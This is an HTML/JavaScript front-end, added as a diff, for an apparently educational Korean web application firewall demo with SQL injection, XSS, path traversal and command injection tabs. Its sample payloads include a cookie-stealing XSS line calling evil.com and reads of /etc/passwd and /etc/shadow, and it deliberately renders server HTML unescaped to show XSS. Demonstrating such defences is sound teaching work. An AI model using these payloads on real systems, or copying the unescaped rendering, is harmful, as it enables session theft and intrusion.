@@ -1,0 +1,1180 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WAF Demo - Web Application Firewall</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        :root {
+            --bg-primary: #0a0e17;
+            --bg-secondary: #111827;
+            --bg-card: #1a2332;
+            --bg-input: #0d1421;
+            --border: #2a3a4e;
+            --text-primary: #e2e8f0;
+            --text-secondary: #94a3b8;
+            --accent-green: #22c55e;
+            --accent-red: #ef4444;
+            --accent-blue: #3b82f6;
+            --accent-yellow: #eab308;
+            --accent-orange: #f97316;
+            --accent-purple: #a855f7;
+        }
+
+        body {
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            min-height: 100vh;
+        }
+
+        /* Header */
+        .header {
+            background: linear-gradient(135deg, #111827 0%, #1e293b 100%);
+            border-bottom: 1px solid var(--border);
+            padding: 16px 32px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .shield-icon {
+            width: 48px;
+            height: 48px;
+            position: relative;
+        }
+
+        .shield-icon svg {
+            width: 48px;
+            height: 48px;
+            filter: drop-shadow(0 0 8px rgba(59, 130, 246, 0.5));
+            transition: filter 0.3s;
+        }
+
+        .shield-icon.active svg {
+            filter: drop-shadow(0 0 12px rgba(34, 197, 94, 0.6));
+        }
+
+        .shield-icon.active svg .shield-fill {
+            fill: #22c55e;
+        }
+
+        .header-title h1 {
+            font-size: 24px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+
+        .header-title p {
+            font-size: 13px;
+            color: var(--text-secondary);
+        }
+
+        /* WAF Toggle */
+        .waf-toggle-area {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .waf-status-label {
+            font-size: 14px;
+            font-weight: 600;
+            min-width: 80px;
+            text-align: right;
+        }
+
+        .waf-status-label.on { color: var(--accent-green); }
+        .waf-status-label.off { color: var(--accent-red); }
+
+        .toggle-switch {
+            position: relative;
+            width: 64px;
+            height: 34px;
+            cursor: pointer;
+        }
+
+        .toggle-switch input { opacity: 0; width: 0; height: 0; }
+
+        .toggle-slider {
+            position: absolute;
+            inset: 0;
+            background: #374151;
+            border-radius: 34px;
+            transition: 0.3s;
+        }
+
+        .toggle-slider::before {
+            content: '';
+            position: absolute;
+            height: 26px;
+            width: 26px;
+            left: 4px;
+            bottom: 4px;
+            background: white;
+            border-radius: 50%;
+            transition: 0.3s;
+        }
+
+        .toggle-switch input:checked + .toggle-slider {
+            background: var(--accent-green);
+            box-shadow: 0 0 16px rgba(34, 197, 94, 0.4);
+        }
+
+        .toggle-switch input:checked + .toggle-slider::before {
+            transform: translateX(30px);
+        }
+
+        /* Main Layout */
+        .main-container {
+            display: grid;
+            grid-template-columns: 1fr 400px;
+            gap: 0;
+            height: calc(100vh - 81px);
+        }
+
+        /* Left Panel - Attack Tabs */
+        .attack-panel {
+            padding: 24px;
+            overflow-y: auto;
+        }
+
+        .tabs {
+            display: flex;
+            gap: 4px;
+            margin-bottom: 20px;
+            background: var(--bg-secondary);
+            border-radius: 12px;
+            padding: 4px;
+        }
+
+        .tab {
+            flex: 1;
+            padding: 10px 12px;
+            border: none;
+            background: transparent;
+            color: var(--text-secondary);
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+            border-radius: 8px;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        .tab:hover { background: var(--bg-card); color: var(--text-primary); }
+
+        .tab.active {
+            background: var(--accent-blue);
+            color: white;
+            box-shadow: 0 2px 8px rgba(59, 130, 246, 0.3);
+        }
+
+        .tab-icon { font-size: 16px; }
+
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+
+        /* Attack Card */
+        .attack-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            overflow: hidden;
+        }
+
+        .attack-header {
+            padding: 16px 20px;
+            background: rgba(0,0,0,0.2);
+            border-bottom: 1px solid var(--border);
+        }
+
+        .attack-header h3 {
+            font-size: 16px;
+            margin-bottom: 4px;
+        }
+
+        .attack-header p {
+            font-size: 13px;
+            color: var(--text-secondary);
+            line-height: 1.5;
+        }
+
+        .attack-body { padding: 20px; }
+
+        .form-group {
+            margin-bottom: 14px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--text-secondary);
+            margin-bottom: 6px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .form-group input, .form-group textarea {
+            width: 100%;
+            padding: 10px 14px;
+            background: var(--bg-input);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            color: var(--text-primary);
+            font-size: 14px;
+            font-family: 'Consolas', 'Courier New', monospace;
+            transition: border-color 0.2s;
+        }
+
+        .form-group input:focus, .form-group textarea:focus {
+            outline: none;
+            border-color: var(--accent-blue);
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.15);
+        }
+
+        .form-group textarea { resize: vertical; min-height: 60px; }
+
+        /* Suggested Attacks */
+        .suggested-attacks {
+            margin-bottom: 16px;
+        }
+
+        .suggested-attacks label {
+            display: block;
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--text-secondary);
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .attack-chips {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 6px;
+        }
+
+        .attack-chip {
+            padding: 6px 12px;
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            border-radius: 6px;
+            color: #fca5a5;
+            font-size: 12px;
+            font-family: 'Consolas', monospace;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .attack-chip:hover {
+            background: rgba(239, 68, 68, 0.2);
+            border-color: rgba(239, 68, 68, 0.5);
+            transform: translateY(-1px);
+        }
+
+        .normal-chip {
+            background: rgba(34, 197, 94, 0.1);
+            border-color: rgba(34, 197, 94, 0.3);
+            color: #86efac;
+        }
+
+        .normal-chip:hover {
+            background: rgba(34, 197, 94, 0.2);
+            border-color: rgba(34, 197, 94, 0.5);
+        }
+
+        /* Send Button */
+        .btn-send {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, var(--accent-blue), #2563eb);
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .btn-send:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.4);
+        }
+
+        .btn-send:active { transform: translateY(0); }
+
+        /* Query Preview */
+        .query-preview {
+            margin-top: 16px;
+            padding: 12px 16px;
+            background: var(--bg-input);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            font-family: 'Consolas', monospace;
+            font-size: 12px;
+            color: var(--accent-yellow);
+            line-height: 1.5;
+            word-break: break-all;
+        }
+
+        .query-preview .label {
+            font-size: 11px;
+            color: var(--text-secondary);
+            font-weight: 600;
+            text-transform: uppercase;
+            margin-bottom: 6px;
+        }
+
+        /* Response Area */
+        .response-area {
+            margin-top: 16px;
+            border-radius: 12px;
+            overflow: hidden;
+            animation: slideDown 0.3s ease;
+        }
+
+        @keyframes slideDown {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .response-blocked {
+            background: linear-gradient(135deg, rgba(239, 68, 68, 0.1), rgba(239, 68, 68, 0.05));
+            border: 1px solid rgba(239, 68, 68, 0.3);
+        }
+
+        .response-passed {
+            background: linear-gradient(135deg, rgba(34, 197, 94, 0.1), rgba(34, 197, 94, 0.05));
+            border: 1px solid rgba(34, 197, 94, 0.3);
+        }
+
+        .response-attack {
+            background: linear-gradient(135deg, rgba(249, 115, 22, 0.1), rgba(249, 115, 22, 0.05));
+            border: 1px solid rgba(249, 115, 22, 0.3);
+        }
+
+        .response-header {
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .response-blocked .response-header { color: var(--accent-red); }
+        .response-passed .response-header { color: var(--accent-green); }
+        .response-attack .response-header { color: var(--accent-orange); }
+
+        .response-icon { font-size: 20px; }
+
+        .response-body {
+            padding: 0 16px 14px;
+            font-size: 13px;
+            line-height: 1.6;
+        }
+
+        .response-body pre {
+            background: rgba(0,0,0,0.3);
+            padding: 10px 14px;
+            border-radius: 6px;
+            font-family: 'Consolas', monospace;
+            font-size: 12px;
+            overflow-x: auto;
+            margin-top: 8px;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+
+        .response-detail {
+            display: grid;
+            grid-template-columns: auto 1fr;
+            gap: 4px 12px;
+            font-size: 12px;
+            margin-top: 8px;
+        }
+
+        .response-detail dt {
+            color: var(--text-secondary);
+            font-weight: 600;
+        }
+
+        .response-detail dd {
+            font-family: 'Consolas', monospace;
+        }
+
+        /* Right Panel - WAF Logs */
+        .log-panel {
+            background: var(--bg-secondary);
+            border-left: 1px solid var(--border);
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+        }
+
+        .log-header {
+            padding: 16px 20px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .log-header h2 {
+            font-size: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .log-count {
+            background: var(--accent-blue);
+            color: white;
+            font-size: 11px;
+            padding: 2px 8px;
+            border-radius: 10px;
+            font-weight: 600;
+        }
+
+        .btn-clear-logs {
+            padding: 6px 12px;
+            background: transparent;
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            color: var(--text-secondary);
+            font-size: 12px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .btn-clear-logs:hover {
+            border-color: var(--accent-red);
+            color: var(--accent-red);
+        }
+
+        .log-list {
+            flex: 1;
+            overflow-y: auto;
+            padding: 8px;
+        }
+
+        .log-empty {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 200px;
+            color: var(--text-secondary);
+            font-size: 14px;
+            gap: 8px;
+        }
+
+        .log-empty-icon { font-size: 32px; opacity: 0.5; }
+
+        .log-entry {
+            padding: 10px 12px;
+            border-radius: 8px;
+            margin-bottom: 6px;
+            font-size: 12px;
+            animation: logSlide 0.3s ease;
+            border: 1px solid transparent;
+        }
+
+        @keyframes logSlide {
+            from { opacity: 0; transform: translateX(20px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        .log-entry.blocked {
+            background: rgba(239, 68, 68, 0.08);
+            border-color: rgba(239, 68, 68, 0.2);
+        }
+
+        .log-entry.passed {
+            background: rgba(34, 197, 94, 0.08);
+            border-color: rgba(34, 197, 94, 0.2);
+        }
+
+        .log-entry.attack {
+            background: rgba(249, 115, 22, 0.08);
+            border-color: rgba(249, 115, 22, 0.2);
+        }
+
+        .log-entry-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 4px;
+        }
+
+        .log-entry-badge {
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 10px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .log-entry.blocked .log-entry-badge {
+            background: rgba(239, 68, 68, 0.2);
+            color: #fca5a5;
+        }
+
+        .log-entry.passed .log-entry-badge {
+            background: rgba(34, 197, 94, 0.2);
+            color: #86efac;
+        }
+
+        .log-entry.attack .log-entry-badge {
+            background: rgba(249, 115, 22, 0.2);
+            color: #fdba74;
+        }
+
+        .log-entry-time {
+            font-family: 'Consolas', monospace;
+            color: var(--text-secondary);
+            font-size: 11px;
+        }
+
+        .log-entry-detail {
+            color: var(--text-secondary);
+            font-family: 'Consolas', monospace;
+            line-height: 1.4;
+        }
+
+        .log-entry-rule {
+            margin-top: 4px;
+            font-size: 11px;
+            color: var(--accent-yellow);
+        }
+
+        /* Stats Bar */
+        .log-stats {
+            padding: 12px 20px;
+            border-top: 1px solid var(--border);
+            display: flex;
+            gap: 16px;
+            font-size: 12px;
+        }
+
+        .stat-item {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .stat-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+        }
+
+        .stat-dot.blocked { background: var(--accent-red); }
+        .stat-dot.passed { background: var(--accent-green); }
+        .stat-dot.attack { background: var(--accent-orange); }
+
+        .stat-value { font-weight: 700; }
+
+        /* XSS Demo */
+        .xss-render-area {
+            margin-top: 10px;
+            padding: 12px;
+            background: white;
+            color: #333;
+            border-radius: 6px;
+            font-size: 13px;
+        }
+
+        .xss-render-label {
+            font-size: 11px;
+            color: var(--text-secondary);
+            margin-bottom: 4px;
+            font-weight: 600;
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: #374151; border-radius: 3px; }
+        ::-webkit-scrollbar-thumb:hover { background: #4b5563; }
+
+        /* Responsive */
+        @media (max-width: 1024px) {
+            .main-container {
+                grid-template-columns: 1fr;
+                grid-template-rows: 1fr 300px;
+            }
+            .log-panel {
+                border-left: none;
+                border-top: 1px solid var(--border);
+            }
+        }
+
+        .severity-badge {
+            display: inline-block;
+            padding: 1px 6px;
+            border-radius: 3px;
+            font-size: 10px;
+            font-weight: 700;
+        }
+
+        .severity-HIGH { background: rgba(239,68,68,0.2); color: #fca5a5; }
+        .severity-MEDIUM { background: rgba(234,179,8,0.2); color: #fde047; }
+        .severity-LOW { background: rgba(59,130,246,0.2); color: #93c5fd; }
+    </style>
+</head>
+<body>
+
+<!-- Header -->
+<header class="header">
+    <div class="header-left">
+        <div class="shield-icon active" id="shieldIcon">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+                <path class="shield-fill" d="M12 2L3 7v5c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7L12 2z" fill="#22c55e" opacity="0.2"/>
+                <path d="M12 2L3 7v5c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7L12 2z" stroke="#22c55e"/>
+                <path d="M9 12l2 2 4-4" stroke="#22c55e" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+        </div>
+        <div class="header-title">
+            <h1>WAF Demo</h1>
+            <p>Web Application Firewall Interactive Demo</p>
+        </div>
+    </div>
+    <div class="waf-toggle-area">
+        <span class="waf-status-label on" id="wafStatusLabel">WAF ON</span>
+        <label class="toggle-switch">
+            <input type="checkbox" id="wafToggle" checked>
+            <span class="toggle-slider"></span>
+        </label>
+    </div>
+</header>
+
+<!-- Main Content -->
+<div class="main-container">
+
+    <!-- Left: Attack Panel -->
+    <div class="attack-panel">
+        <!-- Tabs -->
+        <div class="tabs">
+            <button class="tab active" data-tab="sqli">
+                <span class="tab-icon">&#x1f4be;</span> SQL Injection
+            </button>
+            <button class="tab" data-tab="xss">
+                <span class="tab-icon">&#x1f310;</span> XSS
+            </button>
+            <button class="tab" data-tab="path">
+                <span class="tab-icon">&#x1f4c2;</span> Path Traversal
+            </button>
+            <button class="tab" data-tab="cmd">
+                <span class="tab-icon">&#x1f4bb;</span> Cmd Injection
+            </button>
+        </div>
+
+        <!-- SQL Injection Tab -->
+        <div class="tab-content active" id="tab-sqli">
+            <div class="attack-card">
+                <div class="attack-header">
+                    <h3>SQL Injection (A03:2021)</h3>
+                    <p>로그인 폼에 SQL 구문을 삽입하여 인증을 우회하고 데이터베이스 정보를 탈취합니다.<br>
+                    아래 입력란에 공격 구문을 넣고, WAF ON/OFF에 따른 차이를 확인하세요.</p>
+                </div>
+                <div class="attack-body">
+                    <div class="suggested-attacks">
+                        <label>Quick Attack Payloads</label>
+                        <div class="attack-chips">
+                            <span class="normal-chip attack-chip" onclick="fillSQLi('admin','admin123')">admin / admin123 (정상)</span>
+                            <span class="attack-chip" onclick="fillSQLi(\"' OR '1'='1' --\",\"anything\")">&#x27; OR &#x27;1&#x27;=&#x27;1&#x27; --</span>
+                            <span class="attack-chip" onclick="fillSQLi(\"admin' --\",\"x\")">admin&#x27; --</span>
+                            <span class="attack-chip" onclick="fillSQLi(\"' UNION SELECT * FROM users --\",\"x\")">UNION SELECT</span>
+                            <span class="attack-chip" onclick="fillSQLi(\"'; DROP TABLE users; --\",\"x\")">DROP TABLE</span>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label>Username</label>
+                        <input type="text" id="sqli-username" placeholder="사용자 이름 입력...">
+                    </div>
+                    <div class="form-group">
+                        <label>Password</label>
+                        <input type="text" id="sqli-password" placeholder="비밀번호 입력...">
+                    </div>
+                    <button class="btn-send" onclick="sendSQLi()">
+                        <span>&#x1f680;</span> 로그인 요청 보내기
+                    </button>
+                    <div class="query-preview" id="sqli-preview" style="display:none">
+                        <div class="label">Simulated SQL Query</div>
+                        <div id="sqli-query-text"></div>
+                    </div>
+                    <div id="sqli-response"></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- XSS Tab -->
+        <div class="tab-content" id="tab-xss">
+            <div class="attack-card">
+                <div class="attack-header">
+                    <h3>Cross-Site Scripting / XSS (A03:2021)</h3>
+                    <p>검색 입력에 악성 JavaScript를 삽입하여 다른 사용자의 브라우저에서 실행시킵니다.<br>
+                    쿠키 탈취, 세션 하이재킹, 피싱 등에 악용될 수 있습니다.</p>
+                </div>
+                <div class="attack-body">
+                    <div class="suggested-attacks">
+                        <label>Quick Attack Payloads</label>
+                        <div class="attack-chips">
+                            <span class="normal-chip attack-chip" onclick="fillXSS('노트북')">노트북 (정상)</span>
+                            <span class="attack-chip" onclick="fillXSS('<script>alert(\"XSS\")</script>')">&lt;script&gt;alert()&lt;/script&gt;</span>
+                            <span class="attack-chip" onclick="fillXSS('<img src=x onerror=alert(document.cookie)>')">&lt;img onerror=...&gt;</span>
+                            <span class="attack-chip" onclick="fillXSS('<svg onload=fetch(\"http://evil.com/steal?c=\"+document.cookie)>')">&lt;svg onload=fetch()&gt;</span>
+                            <span class="attack-chip" onclick="fillXSS('<iframe src=javascript:alert(1)>')">&lt;iframe javascript:&gt;</span>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label>Search Query</label>
+                        <input type="text" id="xss-query" placeholder="검색어 입력...">
+                    </div>
+                    <button class="btn-send" onclick="sendXSS()">
+                        <span>&#x1f50d;</span> 검색 요청 보내기
+                    </button>
+                    <div id="xss-response"></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Path Traversal Tab -->
+        <div class="tab-content" id="tab-path">
+            <div class="attack-card">
+                <div class="attack-header">
+                    <h3>Path Traversal (A01:2021)</h3>
+                    <p>파일 경로에 ../를 삽입하여 서버의 허용 범위를 벗어난 민감한 파일에 접근합니다.<br>
+                    시스템 설정 파일, 비밀번호 파일 등이 노출될 수 있습니다.</p>
+                </div>
+                <div class="attack-body">
+                    <div class="suggested-attacks">
+                        <label>Quick Attack Payloads</label>
+                        <div class="attack-chips">
+                            <span class="normal-chip attack-chip" onclick="fillPath('readme.txt')">readme.txt (정상)</span>
+                            <span class="attack-chip" onclick="fillPath('../../etc/passwd')">../../etc/passwd</span>
+                            <span class="attack-chip" onclick="fillPath('../config/db.conf')">../config/db.conf</span>
+                            <span class="attack-chip" onclick="fillPath('/etc/shadow')">/etc/shadow</span>
+                            <span class="attack-chip" onclick="fillPath('C:\\Windows\\win.ini')">C:\Windows\win.ini</span>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label>Filename</label>
+                        <input type="text" id="path-filename" placeholder="파일명 입력...">
+                    </div>
+                    <button class="btn-send" onclick="sendPath()">
+                        <span>&#x1f4c4;</span> 파일 읽기 요청 보내기
+                    </button>
+                    <div id="path-response"></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Command Injection Tab -->
+        <div class="tab-content" id="tab-cmd">
+            <div class="attack-card">
+                <div class="attack-header">
+                    <h3>Command Injection (A03:2021)</h3>
+                    <p>서버의 시스템 명령어에 추가 명령을 삽입하여 임의 코드를 실행합니다.<br>
+                    서버 제어권 탈취, 데이터 유출, 악성코드 설치 등이 가능합니다.</p>
+                </div>
+                <div class="attack-body">
+                    <div class="suggested-attacks">
+                        <label>Quick Attack Payloads</label>
+                        <div class="attack-chips">
+                            <span class="normal-chip attack-chip" onclick="fillCmd('google.com')">google.com (정상)</span>
+                            <span class="attack-chip" onclick="fillCmd('google.com; whoami')">; whoami</span>
+                            <span class="attack-chip" onclick="fillCmd('google.com; cat /etc/passwd')">; cat /etc/passwd</span>
+                            <span class="attack-chip" onclick="fillCmd('google.com | ls -la')">| ls -la</span>
+                            <span class="attack-chip" onclick="fillCmd('$(id)')">$(id)</span>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label>Host to ping</label>
+                        <input type="text" id="cmd-host" placeholder="호스트 입력...">
+                    </div>
+                    <button class="btn-send" onclick="sendCmd()">
+                        <span>&#x1f4e1;</span> Ping 요청 보내기
+                    </button>
+                    <div class="query-preview" id="cmd-preview" style="display:none">
+                        <div class="label">Simulated Command</div>
+                        <div id="cmd-command-text"></div>
+                    </div>
+                    <div id="cmd-response"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Right: Log Panel -->
+    <div class="log-panel">
+        <div class="log-header">
+            <h2>
+                <span>&#x1f4cb;</span> WAF Logs
+                <span class="log-count" id="logCount">0</span>
+            </h2>
+            <button class="btn-clear-logs" onclick="clearLogs()">Clear</button>
+        </div>
+        <div class="log-list" id="logList">
+            <div class="log-empty" id="logEmpty">
+                <div class="log-empty-icon">&#x1f6e1;</div>
+                <div>아직 기록된 로그가 없습니다</div>
+                <div style="font-size:12px">공격을 시도하면 여기에 로그가 표시됩니다</div>
+            </div>
+        </div>
+        <div class="log-stats">
+            <div class="stat-item">
+                <div class="stat-dot blocked"></div>
+                <span>차단: <span class="stat-value" id="statBlocked">0</span></span>
+            </div>
+            <div class="stat-item">
+                <div class="stat-dot attack"></div>
+                <span>공격 성공: <span class="stat-value" id="statAttack">0</span></span>
+            </div>
+            <div class="stat-item">
+                <div class="stat-dot passed"></div>
+                <span>정상: <span class="stat-value" id="statPassed">0</span></span>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    // ========================
+    // Tab Switching
+    // ========================
+    document.querySelectorAll('.tab').forEach(tab => {
+        tab.addEventListener('click', () => {
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(tc => tc.classList.remove('active'));
+            tab.classList.add('active');
+            document.getElementById('tab-' + tab.dataset.tab).classList.add('active');
+        });
+    });
+
+    // ========================
+    // WAF Toggle
+    // ========================
+    const wafToggle = document.getElementById('wafToggle');
+    const wafStatusLabel = document.getElementById('wafStatusLabel');
+    const shieldIcon = document.getElementById('shieldIcon');
+
+    wafToggle.addEventListener('change', async () => {
+        const res = await fetch('/api/waf/toggle', { method: 'POST' });
+        const data = await res.json();
+        updateWAFStatus(data.enabled);
+    });
+
+    function updateWAFStatus(enabled) {
+        if (enabled) {
+            wafStatusLabel.textContent = 'WAF ON';
+            wafStatusLabel.className = 'waf-status-label on';
+            shieldIcon.classList.add('active');
+            wafToggle.checked = true;
+        } else {
+            wafStatusLabel.textContent = 'WAF OFF';
+            wafStatusLabel.className = 'waf-status-label off';
+            shieldIcon.classList.remove('active');
+            wafToggle.checked = false;
+        }
+    }
+
+    // ========================
+    // Fill Functions
+    // ========================
+    function fillSQLi(user, pass) {
+        document.getElementById('sqli-username').value = user;
+        document.getElementById('sqli-password').value = pass;
+    }
+
+    function fillXSS(query) {
+        document.getElementById('xss-query').value = query;
+    }
+
+    function fillPath(filename) {
+        document.getElementById('path-filename').value = filename;
+    }
+
+    function fillCmd(host) {
+        document.getElementById('cmd-host').value = host;
+    }
+
+    // ========================
+    // API Calls
+    // ========================
+    async function sendSQLi() {
+        const username = document.getElementById('sqli-username').value;
+        const password = document.getElementById('sqli-password').value;
+        if (!username) return;
+
+        // Show query preview
+        const preview = document.getElementById('sqli-preview');
+        const queryText = document.getElementById('sqli-query-text');
+        preview.style.display = 'block';
+        queryText.textContent = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
+
+        const formData = new FormData();
+        formData.append('username', username);
+        formData.append('password', password);
+
+        try {
+            const res = await fetch('/api/login', { method: 'POST', body: formData });
+            const data = await res.json();
+            showResponse('sqli-response', data);
+            refreshLogs();
+        } catch (e) {
+            showErrorResponse('sqli-response', e.message);
+        }
+    }
+
+    async function sendXSS() {
+        const query = document.getElementById('xss-query').value;
+        if (!query) return;
+
+        try {
+            const res = await fetch('/api/search?q=' + encodeURIComponent(query));
+            const data = await res.json();
+            showResponse('xss-response', data);
+            refreshLogs();
+        } catch (e) {
+            showErrorResponse('xss-response', e.message);
+        }
+    }
+
+    async function sendPath() {
+        const filename = document.getElementById('path-filename').value;
+        if (!filename) return;
+
+        try {
+            const res = await fetch('/api/file?name=' + encodeURIComponent(filename));
+            const data = await res.json();
+            showResponse('path-response', data);
+            refreshLogs();
+        } catch (e) {
+            showErrorResponse('path-response', e.message);
+        }
+    }
+
+    async function sendCmd() {
+        const host = document.getElementById('cmd-host').value;
+        if (!host) return;
+
+        try {
+            const res = await fetch('/api/ping?host=' + encodeURIComponent(host));
+            const data = await res.json();
+
+            // Show command preview
+            if (data.simulatedCommand) {
+                const preview = document.getElementById('cmd-preview');
+                const cmdText = document.getElementById('cmd-command-text');
+                preview.style.display = 'block';
+                cmdText.textContent = '$ ' + data.simulatedCommand;
+            }
+
+            showResponse('cmd-response', data);
+            refreshLogs();
+        } catch (e) {
+            showErrorResponse('cmd-response', e.message);
+        }
+    }
+
+    // ========================
+    // Response Rendering
+    // ========================
+    function showResponse(containerId, data) {
+        const container = document.getElementById(containerId);
+        let html = '';
+
+        if (data.blocked) {
+            // WAF Blocked
+            html = `
+                <div class="response-area response-blocked">
+                    <div class="response-header">
+                        <span class="response-icon">&#x1f6e1;</span>
+                        WAF BLOCKED - ${escapeHtml(data.wafCategory)}
+                    </div>
+                    <div class="response-body">
+                        <div>${escapeHtml(data.message)}</div>
+                        <dl class="response-detail">
+                            <dt>Rule</dt><dd>${escapeHtml(data.wafRule)}</dd>
+                            <dt>Severity</dt><dd><span class="severity-badge severity-${data.wafSeverity}">${data.wafSeverity}</span></dd>
+                            <dt>Description</dt><dd>${escapeHtml(data.wafDescription)}</dd>
+                            <dt>Matched</dt><dd>${escapeHtml(data.matchedPattern)}</dd>
+                        </dl>
+                        ${data.simulatedQuery ? `<pre>Query: ${escapeHtml(data.simulatedQuery)}</pre>` : ''}
+                    </div>
+                </div>`;
+        } else if (data.alert === 'CRITICAL') {
+            // Attack succeeded (WAF was off)
+            html = `
+                <div class="response-area response-attack">
+                    <div class="response-header">
+                        <span class="response-icon">&#x26a0;</span>
+                        ATTACK SUCCEEDED
+                    </div>
+                    <div class="response-body">
+                        <div><strong>${escapeHtml(data.message)}</strong></div>
+                        ${data.simulatedQuery ? `<pre>Query: ${escapeHtml(data.simulatedQuery)}</pre>` : ''}
+                        ${data.simulatedCommand ? `<pre>$ ${escapeHtml(data.simulatedCommand)}</pre>` : ''}
+                        ${data.output ? `<pre>${escapeHtml(data.output)}</pre>` : ''}
+                        ${data.data ? `<pre>${JSON.stringify(data.data, null, 2)}</pre>` : ''}
+                        ${data.fileContent ? `<pre>${escapeHtml(data.fileContent)}</pre>` : ''}
+                        ${data.renderedHTML ? `
+                            <div class="xss-render-label">Rendered HTML (XSS Vulnerable)</div>
+                            <div class="xss-render-area">${data.renderedHTML}</div>
+                            <div class="xss-render-label" style="margin-top:8px">Safe HTML (Escaped)</div>
+                            <div class="xss-render-area">${data.safeHTML || ''}</div>
+                        ` : ''}
+                    </div>
+                </div>`;
+        } else {
+            // Normal response
+            html = `
+                <div class="response-area response-passed">
+                    <div class="response-header">
+                        <span class="response-icon">&#x2705;</span>
+                        ${escapeHtml(data.message)}
+                    </div>
+                    <div class="response-body">
+                        ${data.simulatedQuery ? `<pre>Query: ${escapeHtml(data.simulatedQuery)}</pre>` : ''}
+                        ${data.output ? `<pre>${escapeHtml(data.output)}</pre>` : ''}
+                        ${data.data ? `<pre>${JSON.stringify(data.data, null, 2)}</pre>` : ''}
+                        ${data.fileContent ? `<pre>${escapeHtml(data.fileContent)}</pre>` : ''}
+                    </div>
+                </div>`;
+        }
+
+        container.innerHTML = html;
+    }
+
+    function showErrorResponse(containerId, message) {
+        document.getElementById(containerId).innerHTML = `
+            <div class="response-area response-blocked">
+                <div class="response-header">
+                    <span class="response-icon">&#x274c;</span> Error: ${escapeHtml(message)}
+                </div>
+            </div>`;
+    }
+
+    function escapeHtml(str) {
+        if (!str) return '';
+        const div = document.createElement('div');
+        div.textContent = str;
+        return div.innerHTML;
+    }
+
+    // ========================
+    // Log Management
+    // ========================
+    let logStats = { blocked: 0, attack: 0, passed: 0 };
+
+    async function refreshLogs() {
+        try {
+            const res = await fetch('/api/waf/logs');
+            const logs = await res.json();
+            renderLogs(logs);
+        } catch (e) {
+            console.error('Failed to fetch logs:', e);
+        }
+    }
+
+    function renderLogs(logs) {
+        const logList = document.getElementById('logList');
+        const logEmpty = document.getElementById('logEmpty');
+        const logCount = document.getElementById('logCount');
+
+        logCount.textContent = logs.length;
+
+        if (logs.length === 0) {
+            logList.innerHTML = '';
